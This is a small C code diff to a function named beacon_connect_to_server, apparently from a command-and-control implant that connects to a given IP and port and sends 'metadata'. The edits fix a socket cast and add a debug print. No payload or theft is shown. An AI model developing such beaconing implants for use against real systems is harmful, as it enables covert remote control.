@@ -26,7 +26,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     printf("asasasasasa");
 
     // Connect to server.
-    iResult = connect(s, (SOCKADDR *) & clientService, sizeof (clientService));
+    iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));
     printf("%d", iResult);
 
 
@@ -41,6 +41,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     char recvbuf[recvbuflen];
 
     //// Send metadata
+    printf("\n%s\n", sendbuf);
     send(s, sendbuf, (int)strlen(sendbuf), 0); 
   
     
